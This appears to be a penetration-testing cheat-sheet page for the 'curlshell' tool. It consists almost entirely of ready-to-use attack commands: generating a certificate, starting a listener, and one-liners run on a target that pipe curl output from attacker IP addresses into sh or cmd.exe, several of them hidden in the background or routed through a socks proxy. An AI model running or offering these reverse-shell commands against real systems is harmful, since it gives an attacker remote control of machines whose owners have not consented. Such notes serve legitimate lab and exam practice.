# curlshell

* https://github.com/SkyperTHC/curlshell
* https://raw.githubusercontent.com/SkyperTHC/curlshell/main/curlshell.py
* Generate SSL Certificate

```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
```

### Start Listener

```
./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
```

### Send callback

```
curl -skfL https://10.10.14.49:80 | sh 
curl -skfL https://192.168.50.170 | sh 
curl -skfL https://172.16.106.140 | cmd.exe
```

### &#x20;Send callback in the background

* On the target:

```
(curl -sfL http://10.10.14.37 | sh &>/dev/null &) 
(curl -skfL https://10.10.14.49:80 | sh &>/dev/null &)
start "" /B cmd /C "curl -skfL https://172.16.106.140:8443 | cmd.exe"
 Start-Process -NoNewWindow -FilePath "cmd.exe" -ArgumentList "/c curl -sfkl https://172.16.106.140:8443 | cmd.exe"
```

* with a socks proxy

```
./curlshell.py -x socks5h://5.5.5.5:1080 --certificate cert.pem --private-key key.pem --listen-port 8080
```

